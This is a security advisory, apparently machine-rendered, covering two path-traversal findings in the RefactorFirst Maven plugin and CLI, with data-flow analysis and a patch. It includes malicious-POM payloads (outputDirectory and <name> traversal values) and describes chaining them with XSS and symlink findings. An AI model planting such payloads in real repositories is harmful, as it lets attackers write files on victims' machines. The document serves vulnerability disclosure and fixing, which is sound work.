`ReportWriter.writeReportToDisk()`: `htmlReport`/`simpleHtmlReport` (single-page HTML report), `jsonreport` (JSON data)
and `csvreport` (CSV rows). The README documents the intended output location as `target/site/` inside the analyzed
project. The write directory, however, is not derived from the analyzed project's build directory at all: each mojo
hard-codes
`project.getModel().getReporting().getOutputDirectory()` — the analyzed project's own
`<reporting><outputDirectory>` POM element — into the report executor, with only a literal `"${project.basedir}/"`
prefix strip. When the analyzed project belongs to the attacker (the tool's core untrusted-input channel, threat-model
persona A1 / trust boundary TB4), that POM element is attacker-controlled free text.

## Description

The four write-producing mojos all pass the same expression to the report layer (RefactorFirstHtmlReport.java:71-74,
RefactorFirstSimpleHtmlReport.java:71-74, RefactorFirstMavenJsonReport.java:33-36, RefactorFirstMavenCsvReport.java:
43-46):

    project.getModel().getReporting().getOutputDirectory()
        .replace("${project.basedir}" + File.separator, "")

Source. The value is the analyzed project's `<reporting><outputDirectory>` element (super-POM default
`${project.build.directory}/site`, overridden by any non-null child value — child-dominant merge). Maven model building
performs no containment check on it, but it is NOT verbatim: model interpolation path-translates the element into a
basedir-anchored ABSOLUTE path (POC-verified on Maven 3.8.7 via
`help:evaluate` and landing-spot discrimination). Three attacker shapes reach the mojo as basedir-absolute paths:
(a) an absolute path passes through unchanged (`/home/victim/x`, `/etc/foo`), (b) a relative traversal
(`../../../shared`) is anchored at the project basedir and still escapes the repo, and (c) an empty element
(`<outputDirectory/>`) becomes the basedir itself, so the write lands at `<repo-root>/<filename>` (in-repo, NOT a
filesystem-root write — POC-refuted under uid 0).

Sanitizer. The `.replace("${project.basedir}/", "")` strips exactly one literal sequence that **cannot occur** in the
value at this point — interpolation has already replaced any `${project.basedir}` occurrence with the absolute basedir.
It does not match absolute paths, `..` segments, or the empty string, and is never checked against the project basedir.
It is dead code and contains nothing. Notably the value it passes in the *normal* case is already the absolute
`<basedir>/target/site`, i.e. the tool routinely writes via absolute paths. There is no `@Parameter` for this value: the `@Parameter(property =
"project.build.directory") outputDirectory` field present on three mojos is only
`log.info()`-ed (RefactorFirstHtmlReport.java:59) and never used for the write, so neither a plugin `<configuration>`
nor a `-D` property can redirect or contain the write directory.

Sink. `ReportWriter.writeReportToDisk()` (report/src/main/java/org/hjug/refactorfirst/ report/ReportWriter.java:15-36)
performs, in order:

1. `new File(reportOutputDirectory)` + `mkdirs()` (:15-18) — **unconditional directory-tree creation** at the
   attacker-chosen location with the victim's privileges, before any other operation (even if the later write fails, the
   tree exists);
2. `pathname = reportOutputDirectory + File.separator + filename` (:21) — raw string concatenation with no
   canonicalization or containment check. POC-verified on Maven 3.8.7: the directory is always an absolute path by the
   time it reaches the sink (model path translation anchors relative values at the project basedir and turns an empty
   element into the basedir itself), so `..` segments still escape the repo and the empty shape lands at
   `<repo-root>/<filename>`; a filesystem-root write does NOT occur (refuted under uid 0);
3. `createNewFile()` (:26) — **not an overwrite guard**: the subsequent
   `Files.newBufferedWriter(reportFile.toPath(), …)` (:31) opens with default options CREATE | TRUNCATE_EXISTING |
   WRITE, so a pre-existing file at the path (or at the end of a symlink chain — no NOFOLLOW_LINKS) is truncated and
   overwritten with the report content;
4. all IOExceptions are caught and logged (:28-35) and the final log line claims
   "Done! View the report at target/site/…" (:36) — out-of-tree writes produce no error and no warning (no detection
   signal).

Reachability with minimal input. No plugin declaration or source file is needed in the malicious repo — `${project}`,
`${project.name}` and `${project.version}` are read from the current project regardless of how the goal was invoked.
POC-verified prerequisite split on the audited snapshot: `csvreport`'s "No Git repository found" early-exit itself calls
`writeReportToDisk` (CsvReport.java:69), so a directory containing a single crafted `../pom.xml` (no `.git`, no sources) is
sufficient for `csvreport`; `htmlReport`/`simpleHtmlReport`/`jsonreport` however crash with an NPE inside `GitLogReader`
(via `SimpleHtmlReport.printProjectHeader`
/ `CostBenefitCalculator.<init>`) before any write when jgit finds no `.git` — these three goals need a `.git` present,
which any real cloned repository has.

Content. The written artifact is not fixed boilerplate: the HTML report embeds the analyzed POM's `<name>`/`<version>`
(title/header/no-git message — confirmed XSS source BUG-R2-S2-A1-H2), the git `remote.origin.url` (BUG-R2-S2-A1-H1) and
repo-derived class/file/cycle names (BUG-R2-S2-A1-H3/H4, A2-H1); the JSON report embeds `fileName`/`className`/
`fullFilePath` per disharmony entry; the CSV content embeds POM name/version. The primitive is thus "write
semi-controlled content to an arbitrary path": e.g. drop an HTML file carrying attacker-controlled script into a served
webroot, a CI-published artifacts directory, or any user-writable location, with the victim's privileges.

Bounds (honest): three of the four goals use a fixed filename (`refactor-first-report.html` — SimpleHtmlReport.java:
84 + :950-953;
`refactor-first-data.json` — JsonReportExecutor.java:22), so standalone this is not arbitrary-name/arbitrary-content
overwrite; the CSV goal composes its filename from free-text POM values (tracked separately as HYP-R2-S2-A5-H2) and
arbitrary-name overwrite via symlinked final components is tracked as HYP-R2-S2-A5-H3. The standalone primitive —
arbitrary directory-tree creation + known-named file write/truncation at an arbitrary path + symlink-following write,
all with the victim's privileges — matches the published Maven-ecosystem vulnerability class
(maven-remote-resources-plugin issue #265, CWE-22: raw `new File(outputDirectory,
resource)` + unconditional `FileUtils.mkdir`; plexus-utils `Expand.extractFile`
traversal, CVE-2025-67030, rated high).

## Attack

The attacker is the provider of the codebase being analyzed (threat-model persona A1): a public repo, a vendor drop, a
pull-request branch, or any third-party project the victim wants a RefactorFirst report for. The victim clones it and
runs the tool's headline documented command inside the repo — `mvn
org.hjug.refactorfirst.plugin:refactor-first-maven-plugin:0.9.0:htmlReport` (or simpleHtmlReport/jsonreport/csvreport;
the README's quick-start, "From The Command Line As an HTML Report", and GitHub-Actions sections all use exactly this
form). Direct goal invocation executes only this goal's code — no lifecycle, no other plugin from the analyzed POM — so
the victim's reasonable expectation for an analysis/reporting goal ("read my repo, write under target/site") is what
makes the flow realistic. The tool then (1) creates the attacker-chosen directory tree with the victim's privileges
(mkdirs runs unconditionally), and (2) writes/truncates a report file at the attacker-chosen path with semi-controlled
content, while logging
"Done! View the report at target/site/…" and no error — the victim has no detection signal. Real-scenario impact
(EXP-R6-E12, simulated environments, 39/39 checks):
on a developer workstation the attacker plants the fixed-name report at any user-writable path — username-independently
via the traversal shape (clone-depth knowledge only) — creating arbitrary directory trees en route, silently truncating
any pre-existing same-named file (realistically: a previously published RefactorFirst report of another project in a
shared/served directory — every HTML report shares the name `refactor-first-report.html`), and, where the victim runs a
served user-writable webroot (`~/public_html`, a dev-server docroot) or a persistent/self-hosted CI publishes to a
served artifacts directory, placing a page that executes its embedded attacker script in that origin (real-Chromium-
verified; the script content rides the A1/A2 injection channels). On an ephemeral hosted CI runner the standalone plant
is job-scoped pollution only, and the README's documented GitHub-Actions flow reads the default `target/site` path — a
redirected write silently empties that flow's summary leg (verified: `cat` fails, 1-byte summary, exit 0) rather than
feeding it; inside that same documented flow the leading `mvn clean` (stock maven-clean-plugin 2.5, whose
`reportDirectory` is fed by the same untrusted POM element) deletes the entire pre-existing victim directory named by
the element before the goal re-creates and re-plants it — an adjacent arbitrary-directory-deletion primitive of the
clean plugin, not this finding's CVSS. Persistence against `mvn clean` is clean-plugin-version dependent (POC-verified
on Maven 3.8.7): with the stock default-bound maven-clean-plugin 2.5 the planted report directory itself IS deleted by a
plain `mvn clean` (its
`reportDirectory` parameter is fed by the same POM element — which also makes plain
`mvn clean` on an attacker POM an arbitrary-directory-deletion primitive of the clean plugin, adjacent to this finding),
while with maven-clean-plugin 3.2.0 pinned the planted directory survives `mvn clean`; in all cases the mkdirs-created
ancestor tree outside the reporting leaf survives. Bounds: three of the four goals write a fixed filename, so standalone
this finding cannot clobber arbitrary existing victim files (configs, dotfiles, startup files) — the arbitrary-name /
arbitrary-path escalation is delivered only in composition with the committed- symlink finding BUG-R2-S2-A5-H3
(demonstrated: victim `.bashrc` truncated and rewritten through the link, same inode preserved — capability owned by H3)
and the CSV filename composition of H2. Composed with the confirmed A1/A2 report-injection findings
(BUG-R2-S2-A1-H1/H2/H3/H4, A2-H1/H2), the artifact at the chosen path is a full HTML document containing
attacker-controlled markup/JavaScript — turning a report-viewing XSS into a "plant script-bearing HTML at a chosen
location" chain (routed to exp-build as a backflow lead). All demonstrations are Linux; Windows POM shapes were not
tested.

### Payload

The payload is a single XML element in the analyzed repository's root `../pom.xml`:

    <reporting>
      <outputDirectory>/home/victim/.local/state/evilreports</outputDirectory>
    </reporting>

Working shapes: (a) absolute path — creates the full directory tree (mkdirs) and writes `refactor-first-report.html` /
`refactor-first-data.json` /
`RefFirst_P<name>_PV<version>_PD<date>.csv` at that path; (b) relative traversal —
`<outputDirectory>../../shared/webroot</outputDirectory>` is path-translated to a basedir-anchored absolute path (Maven
3 model building) and lands outside the repo; (c) empty element — `<outputDirectory/>` becomes the basedir itself, so
the write lands at `<repo-root>/<filename>` (in-repo, non-`../target` placement; POC-refuted as a filesystem-root write
under uid 0). The element needs no `${}` syntax and no plugin declaration; a directory containing only this `../pom.xml`
reaches the write for `csvreport`, and a `.git`-bearing directory containing it (any real cloned repo) reaches the write
on all four goals. The written content additionally carries POM/repo-derived strings (project name/version, git remote
URL, class/file names), so the HTML variants place attacker-influenced markup/script at the chosen path.

## Data flow

### Step 1 —

`refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java:71-74 (same pattern: RefactorFirstSimpleHtmlReport.java:71-74, RefactorFirstMavenJsonReport.java:33-36, RefactorFirstMavenCsvReport.java:43-46)`

Mojo execute () derives the write directory from the analyzed project's own POM:
`project.getModel().getReporting().getOutputDirectory().replace("${project.basedir}" + File.separator, "")`. The
expression is hard-coded in the mojo body — no @Parameter exposes it, and the `project.build.directory` @Parameter
(RefactorFirstHtmlReport.java:40/59) is only logged, never used for the write.

### Step 2 — `(Maven 3.x model building, external to this repo) super-POM default `${project.build.directory}/site

` overridden child-dominantly by the analyzed POM's `<reporting><outputDirectory>``

Maven 3.x model building (external to this repo) path-translates the element: super-POM default
`${project.build.directory}/site` overridden child-dominantly, relative values anchored at the project basedir, empty
value becomes the basedir — the value reaches the mojo as an absolute path in every case (POC-verified via landing-spot
discrimination and `help:evaluate`).

### Step 3 — `refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java:74`

The only transform, `.replace("${project.basedir}/", "")`, strips one literal sequence that cannot occur
post-interpolation — dead code; it does not match absolute paths, `..` segments, or the empty string, and is never
checked against the project basedir.

### Step 4 —

`report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:113 (htmlReport + simpleHtmlReport goals, filename from :84 + :950-953); report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java:69,108,128 (csvreport, no-git early-exit included); report/src/main/java/org/hjug/refactorfirst/report/json/JsonReportExecutor.java:55,70 (jsonreport, error branch included)`

Report executors pass the directory straight to the shared sink — no validation in any caller; csvreport's no-git
early-exit reaches the write on a pom-only repo (POC-verified); htmlReport/simpleHtmlReport/jsonreport NPE before the
write on a git-less repo (POC-verified prerequisite: a `.git` must exist, as in any real cloned repo).

### Step 5 — `report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java:15-18`

`new File(reportOutputDirectory)` + `mkdirs()` — unconditional directory-tree creation at the attacker-chosen location
with the victim's privileges, before any other operation.

### Step 6 — `report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java:21-33`

`pathname = reportOutputDirectory + File.separator + filename` (raw string concat, no canonicalization/containment) →
`createNewFile()` → `Files.newBufferedWriter(reportFile.toPath(), …)` with default CREATE|TRUNCATE_EXISTING|WRITE
options: the directory is always absolute at this point (model path translation — POC-verified), `..` segments still
escape the repo, the empty shape lands at `<repo-root>/<filename>` (no filesystem-root write — POC-refuted under uid 0);
pre-existing same-named files and symlink targets are truncated and overwritten with the report content.

### Step 7 — `report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java:28-36`

All IOExceptions caught and logged (goal never fails on a hostile path); final log claims "Done! View the report at
target/site/…" — misleading normalcy, no detection signal for out-of-tree writes.

## Fix / patch notes

diff --git a/report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java
b/report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java ---
a/report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java +++
b/report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java @@ -9,6 +9,29 @@ import java.nio.file.Files;
import lombok.extern.slf4j.Slf4j;

@Slf4j public final class ReportWriter {

+
+ /**
+     * Resolves a configured report output directory against the project base directory
+     * and refuses any value that escapes it. The value originates from the *analyzed*
+     * project's POM (<reporting><outputDirectory>), which is untrusted input whenever
+     * the tool runs against a third-party repository: absolute paths, ".." segments
+     * and empty values must never redirect report writes outside the analyzed project.
+     */
+ public static String containReportDirectory (final File baseDir, final String configuredDir) {
+        final Path base =
+                (baseDir != null ? baseDir.toPath() : Path.of("")).toAbsolutePath().normalize();
+        final String configured = configuredDir == null || configuredDir.isBlank()
+                ? "target" + File.separator + "site"
+                : configuredDir;
+        final Path resolved = base.resolve(configured).normalize();
+        if (!resolved.startsWith(base)) {
+            throw new IllegalArgumentException(
+                    "Report output directory escapes the project base directory: " + configuredDir);
+        }
+        return resolved.toString();
+ }

  public static void writeReportToDisk (final String reportOutputDirectory, final String filename, final String
  string) { diff --git a/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java
  b/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java ---
  a/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java +++
  b/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java @@ -10,6 +10,7 @@ import
  org.apache.maven.plugins.annotations.ResolutionScope; import org.apache.maven.project.MavenProject; import
  org.hjug.refactorfirst.report.HtmlReport; +import org.hjug.refactorfirst.report.ReportWriter;

@Slf4j @Mojo (@@ -71,8 +72,8 @@ public class RefactorFirstHtmlReport extends AbstractMojo { projectName, projectVersion,
project.getBasedir (),

-                project.getModel()
-                        .getReporting()
-                        .getOutputDirectory()
-                        .replace("${project.basedir}" + File.separator, ""));

+                ReportWriter.containReportDirectory(
+                        project.getBasedir(), project.getModel().getReporting().getOutputDirectory()));
  } } diff --git a/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstSimpleHtmlReport.java
  b/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstSimpleHtmlReport.java ---
  a/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstSimpleHtmlReport.java +++
  b/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstSimpleHtmlReport.java @@ -10,6 +10,7 @@
  import org.apache.maven.plugins.annotations.ResolutionScope; import org.apache.maven.project.MavenProject; import
  org.hjug.refactorfirst.report.SimpleHtmlReport; +import org.hjug.refactorfirst.report.ReportWriter;

@Slf4j @Mojo (@@ -71,8 +72,8 @@ public class RefactorFirstSimpleHtmlReport extends AbstractMojo { projectName,
projectVersion, project.getBasedir (),

-                project.getModel()
-                        .getReporting()
-                        .getOutputDirectory()
-                        .replace("${project.basedir}" + File.separator, ""));

+                ReportWriter.containReportDirectory(
+                        project.getBasedir(), project.getModel().getReporting().getOutputDirectory()));
  } } diff --git a/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenJsonReport.java
  b/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenJsonReport.java ---
  a/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenJsonReport.java +++
  b/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenJsonReport.java @@ -12,6 +12,7 @@
  import org.apache.maven.project.MavenProject; import org.hjug.refactorfirst.report.json.JsonReportExecutor; +import
  org.hjug.refactorfirst.report.ReportWriter;

@Mojo (name = "jsonreport", @@ -30,10 +31,9 @@ public class RefactorFirstMavenJsonReport extends AbstractMojo {
JsonReportExecutor jsonReportExecutor = new JsonReportExecutor (); jsonReportExecutor.execute (project.getBasedir (),

-                project.getModel()
-                        .getReporting()
-                        .getOutputDirectory()
-                        .replace("${project.basedir}" + File.separator, ""));

+                ReportWriter.containReportDirectory(
+                        project.getBasedir(), project.getModel().getReporting().getOutputDirectory()));
  } } diff --git a/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenCsvReport.java
  b/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenCsvReport.java ---
  a/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenCsvReport.java +++
  b/refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenCsvReport.java @@ -10,6 +10,7 @@
  import org.apache.maven.plugins.annotations.ResolutionScope; import org.apache.maven.project.MavenProject; import
  org.hjug.refactorfirst.report.CsvReport; +import org.hjug.refactorfirst.report.ReportWriter;

@Slf4j @Mojo (@@ -40,10 +41,10 @@ public class RefactorFirstMavenCsvReport extends AbstractMojo { showDetails,
projectName, projectVersion,

-            project.getModel()
-                    .getReporting()
-                    .getOutputDirectory()
-                    .replace("${project.basedir}" + File.separator, ""),

+            ReportWriter.containReportDirectory(
+                    project.getBasedir(), project.getModel().getReporting().getOutputDirectory()),
             project.getBasedir());
  } }

Notes: the containment helper resolves the configured value against the analyzed project's basedir (falling back to CWD
for the `requiresProject=false` stub case), defaults an empty/missing element to `target/site` under the base, and
throws on any value that escapes the base — absolute paths and `..` traversal are rejected, and the normal interpolated
value (`<basedir>/target/site`, already absolute) stays inside the base so default behavior is preserved. This patch
addresses the directory component only; the CSV filename composition from free-text POM values (HYP-R2-S2-A5-H2) and the
symlink-following truncation write (HYP-R2-S2-A5-H3) require their own handling (filename containment in
`CsvReport.execute`/`ReportWriter`, and `NOFOLLOW_LINKS`/containment in the writer).

## References

- https://cwe.mitre.org/data/definitions/22.html
- https://cwe.mitre.org/data/definitions/73.html
- https://github.com/apache/maven-remote-resources-plugin/issues/265
- https://github.com/advisories/GHSA-6fmv-xxpf-w3cw
- https://maven.apache.org/pom.html#Reporting

---

_Rendered from original VulnHunter / VulnForge `report.yaml` by OpenVuln._

## [medium] CSV report filename composition (CsvReport.execute → ReportWriter raw path concat) embeds the analyzed repo's POM <name>/<version> unsanitized — path traversal writes an attacker-planted CSV file outside the output directory on both the CLI and Maven-mojo paths

- key: `BUG-R2-S2-A5-H2`
- disclosure: owner_only
- cwe: CWE-22
- file: `../cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java`

# CSV report filename composition (CsvReport.execute → ReportWriter raw path concat) embeds the analyzed repo's POM <name>/<version> unsanitized — path traversal writes an attacker-planted CSV file outside the output directory on both the CLI and Maven-mojo paths

- **Project:** refactorfirst/RefactorFirst
- **Finding key:** BUG-R2-S2-A5-H2
- **CWE:** CWE-22
- **CVSS:** 4.3 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`)
- **EV priority:** P2
- **EV score:** 5
- **PoC status:** reproduced
- **EXP status:** downgraded
- **Affected versions:** goal path: confirmed on the latest release 0.9.0 and the audited snapshot 0.10.0-SNAPSHOT
  (commit 65d3bef) — the POM-derived CSV filename composition (RefFirst_P<name>_PV<version>_PD<date>.csv) and the
  raw-concat ReportWriter sink have been part of the report module across releases; CLI path: confirmed on released
  0.6.2 (the last released CLI that starts — 0.7.0 through 0.9.0 CLI jars crash at startup on a pre-existing picocli
  duplicate-option bug unrelated to this finding) and on the snapshot build (which likewise needs the harness patch
  documented in the audit notes to start at all); earlier versions likely affected, range not verified below 0.6.2

## Exploitability rationale

Reachability R:L — the attacker must occupy the role of "author of the repository the victim chooses to analyze"
(file-control class, no credentials or network position); the malicious repo is delivered remotely (hosted clone URL,
PR, or archive) but the victim must fetch it and run the report command — the same grade as the other confirmed
report-injection findings on this source. Exposure E:C — the CSV report is a first-class report type (registered
`csvreport` Maven goal, CLI `-t CSV` completion candidate) but is not the default: the CLI default report type is HTML,
so the victim must explicitly select CSV or invoke the csvreport goal; the attacker can also bind the goal into the
victim's routine `mvn
verify`/`mvn site` via the analyzed POM's own <build><executions> (verified), but that flow is shared with the generic
malicious-POM-build scenario and adds no independent exposure. Certainty C:D — pure deterministic string concatenation
with zero validation on the whole path; the required first path component (`RefFirst_P<prefix>`) is shipped inside the
attacker's repo (verified to survive both archive extraction and a real git clone), and root-anchored `..` chains (`..`
beyond `/` is a no-op on POSIX) make one fixed payload work at any clone depth — the out-of-scope write fires every run,
on every delivery persona (archive + CLI, git clone + CLI, git clone + goal, POM-bound CI `mvn verify`), on the latest
released plugin 0.9.0 and the released CLI 0.6.2, silently (victim command exit 0). Impact I:D — the write verifiably
lands a file OUTSIDE the tool's authorized output directory with an attacker-chosen stem and substantially
attacker-authored (even multi-line) content, so it is a genuine host-level integrity violation; but the realistic
maximum standalone capability stops there: the forced filename tail
`_PV<version>_PD<12-digit-date>.csv` is appended after all attacker text, so exact-name overwrite of arbitrary victim
files is structurally impossible (demonstrated:
invoice.csv, .bashrc and a stamp-mismatched *_PD<12 digits>.csv all survive untouched), no new directories are created
(creation only, in existing directories), there is no read primitive, no availability impact, and no consumer of the
planted file is invoked by the tool — the planted CSV is inert data. Every deeper consequence (spreadsheet formula
execution via the CSV-formula-injection sibling finding, or ingestion by an environment-specific automated *.csv
consumer) requires a composition with another finding plus a second victim interaction, which is below the
significant-impact grade (session-class/partial-disclosure) that the I:S tier denotes; not I:S, let alone I:X.

## Code anchors

| File                                                                                              | Line | Function                         |
|---------------------------------------------------------------------------------------------------|-----:|----------------------------------|
| `../cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java`                                     |  156 | `inferArgumentsFromMavenProject` |
| `../cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java`                                     |  169 | `inferArgumentsFromMavenProject` |
| `../cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java`                                     |  130 | `call`                           |
| `../report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java`                               |   24 | `execute`                        |
| `../report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java`                               |   69 | `execute`                        |
| `../report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java`                            |   21 | `writeReportToDisk`              |
| `../report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java`                            |   26 | `writeReportToDisk`              |
| `../refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenCsvReport.java` |   24 | `RefactorFirstMavenCsvReport`    |

## Background

RefactorFirst is a developer/CI-side static-analysis tool (Maven plugin + standalone CLI jar) that ranks code
disharmonies (god classes, cycles) in a codebase and writes a report file. Its documented primary workflow is to run it
against a cloned repository without building it ("the source code does not need to be built"), which makes the analyzed
repo's POM values untrusted input: the threat model's TB1 boundary (repo content → analysis tool) explicitly covers
analyzing third-party repos. The CSV report is one of four report types; uniquely among them it composes its output
*filename* from the analyzed project's `<name>` and `<version>` (`RefFirst_P<name>_PV<version>_PD<yyyyMMddhhmm>.csv`)
instead of using a fixed name. The CLI entry point reads the analyzed `../pom.xml` with the raw `MavenXpp3Reader` (no model
building, no validation) precisely so that users who omit `-p`/`-v` get the values inferred — meaning repo-controlled
text reaches the output path with no Maven execution of any kind, so the usual "a malicious POM already implies code
execution" caveat does not apply to this entry point.

## Description

On every CLI invocation, `ReportCommand.call()` first calls `inferArgumentsFromMavenProject()`, which parses `../pom.xml`
of the analyzed repo with maven-model's low-level `MavenXpp3Reader` (no validation/interpolation) and assigns
`projectName`/`projectVersion` from `<name>`/`<version>` whenever the user did not pass `-p`/`-v`. With `-t CSV` these
strings flow into `CsvReport.execute()`, which builds the output filename by raw concatenation: `RefFirst` + `_P` +
projectName + `_PV` + projectVersion + `_PD` + timestamp + `.csv`. No code on either path sanitizes path characters (a
sweep for sanitize/FilenameUtils/normalize/replaceAll across report/, cli/ and refactor-first-maven-plugin/ production
sources finds nothing on this path). The filename is joined to the output directory by
`ReportWriter.writeReportToDisk()` via `reportOutputDirectory + File.separator + filename` — raw string concatenation
into `new File(...)`, followed by `createNewFile()` and a full `Files.newBufferedWriter` write, with no canonicalization
or containment check, and with all IOExceptions caught and only logged. Because `/` (and `\` on Windows) inside the
filename creates additional path components, `..` segments in `<name>`/`<version>` traverse out of the output directory.
The same composition is reachable from the Maven mojo `csvreport`, whose
`@Parameter(defaultValue = "${project.name}")` / `${project.version}` come from the analyzed project's model (`<name>`
is a display field with no character-set validation in any Maven 3.x model validator). The write is reachable through
every realistic delivery channel, all dynamically verified: an archive download (no `.git` — the no-git early-exit
branch still writes the report), a real `git clone` on both the CLI (run from the repo root: JGit resolves `./.git`, the
base-dir equality check passes, and the no-god-classes branch writes "Congratulations!  <name> <version> has no God
classes!") and the mojo, a routine CI `mvn verify` whose csvreport execution is bound by the attacker's own POM, and the
latest released plugin 0.9.0 / released CLI 0.6.2. Two structural constraints bound the primitive: (1) the literal
`RefFirst_P` prefixes the first path component, so a directory literally named `RefFirst_P<prefix>` must exist under the
output directory for the traversal to resolve — the attacker satisfies this by shipping that directory inside the repo
(materialized identically by archive extraction and by git clone; without it the write fails silently); (2) the final
path component always ends with the forced tail `_PV<version>_PD<12-digit-date>.csv`, so exact-name overwrite of
arbitrary victim files is impossible (demonstrated: invoice.csv, .bashrc and even a stamp-mismatched *_PD<12 digits>.csv
survive untouched; a new sibling file with the forced tail is created instead). Within those bounds the attacker gains
exactly: silent creation of a file with an arbitrary chosen stem in any EXISTING directory (root-anchored `..` chains
are depth-independent on POSIX since `..` beyond `/` is a no-op; no new directories are ever created — `createNewFile()`
creates no parents), silent overwrite strictly of files whose full name matches the composed tail with the same-minute
stamp (in practice only RefactorFirst's own CSV outputs and the attacker's own prior plants), and substantially
attacker-authored content — including multi-line content, since XML character references such as `&#10;` in `<name>`/
`<version>` survive the POM parse into both the file name and the file body. There is no read primitive, no availability
impact, and no consumer of the planted file is invoked by the tool: the planted CSV is inert data until a human or an
environment-specific automated consumer processes it. Per-OS: on Windows the same mechanism works with `\` separators
and drive-root `..` clamping, but control characters (the newline payload shape) are illegal in Win32 filenames, and a
`:` in the chosen stem merely redirects the write into an NTFS alternate data stream of an existing base file (a hidden
stream, not a modification of the base file's primary content); the capability ceiling is identical on all platforms.

## Attack

Attacker persona A1 (repo author) hosts the malicious repo (public git host, PR to the victim's project, or a
zip/tarball download). The victim — a developer or CI quality gate doing exactly what the tool is for, analyzing a
third-party repo — fetches it and produces a CSV report from the repo root (`rf -t CSV`, `java -jar cli… -t CSV`,
`mvn org.hjug…:csvreport`, or a routine `mvn verify`/`site` into which the attacker's POM bound the goal). No part of
the malicious POM is executed on the CLI path (the CLI only reads it), and no victim-side path configuration is
involved. The report file then appears at an attacker-chosen location OUTSIDE the output directory/repo; failures are
silent (logged only), and even the success case only logs a path. Observable impact, honestly bounded: an
attacker-named, attacker-authored (optionally multi-line) CSV file silently planted in any EXISTING directory the victim
user can write — home directory, Documents/Desktop, shared drives, /tmp — with no artifact left inside the analyzed
repo; silent replacement strictly of files whose full name matches `…_PV<version>_PD<12-digit stamp>.csv` at the same
minute (essentially only RefactorFirst's own CSV outputs and the attacker's own prior plants); and a ready-made delivery
vehicle for the spreadsheet-formula payloads of the CSV-formula-injection finding (a planted
"Invoice_Q4_PVapproved_PD20251231.csv" in the victim's Documents is far more likely to be opened than a report buried in
target/site) — with the caveat that this last tier is a composition with a separate finding and requires the additional
victim interaction of opening the planted file; on its own the primitive plants inert data and does not read, delete, or
execute anything.

### Payload

A malicious repository containing (1) a `../pom.xml` with e.g. `<name>evil/../../../../../../../../tmp/planted</name>`
(arbitrary `<version>`), and (2) a tracked directory named `RefFirst_Pevil/` (with any file inside, e.g. `.keep`) at the
repo root. No sources and no `.git` are required — an archive download suffices (the no-git branch still writes the
report). One fixed payload works at any clone depth because `..` beyond the filesystem root is a no-op on POSIX; on
Windows, `C:\Users\Public`-style targets work the same way. The victim runs `rf -t CSV` (or the `csvreport` Maven goal)
from the repo root; the tool writes e.g. `/tmp/planted_PV1.0_PD202601011200.csv` outside the repo, or
`<chosen-stem>_PV…_PD…csv` in any existing directory.

## Data flow

### Step 1 — `cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java:93`

`call()` unconditionally invokes `inferArgumentsFromMavenProject()` before any report generation — on default
invocations nothing the user passed overrides the POM-derived values.

### Step 2 — `cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java:156-158`

The analyzed repo's `../pom.xml` is parsed with the raw `MavenXpp3Reader.read()` — maven-model's low-level XML→Model
mapper: no model building, no interpolation, no validation. (Source-side control: none.)

### Step 3 — `cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java:169-172`

`projectName = project.getName()` / `projectVersion = project.getVersion()` — the raw `<name>`/`<version>` text of the
analyzed POM becomes the report arguments whenever `-p`/`-v` were not passed.

### Step 4 — `cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java:128-130`

`case CSV:` dispatches `csvReport.execute(showDetails, projectName, projectVersion, outputDirectory, baseDir)` with
`outputDirectory` defaulting to `.` (the repo root / CWD) and `baseDir` defaulting to `.`.

### Step 5 — `report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java:24-33`

Filename composed by raw concatenation: `RefFirst` + `_P` + projectName + `_PV` + projectVersion + `_PD` +
`yyyyMMddhhmm` + `.csv`. No path-safety validation of either POM-derived value anywhere on this path.

### Step 6 — `report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java:56-69`

No-git early-exit branch still calls `writeReportToDisk(outputDirectory, filename, …)` — a pom-only repo (no `.git`, no
sources) reaches the write, with content embedding the attacker-controlled name/version verbatim.

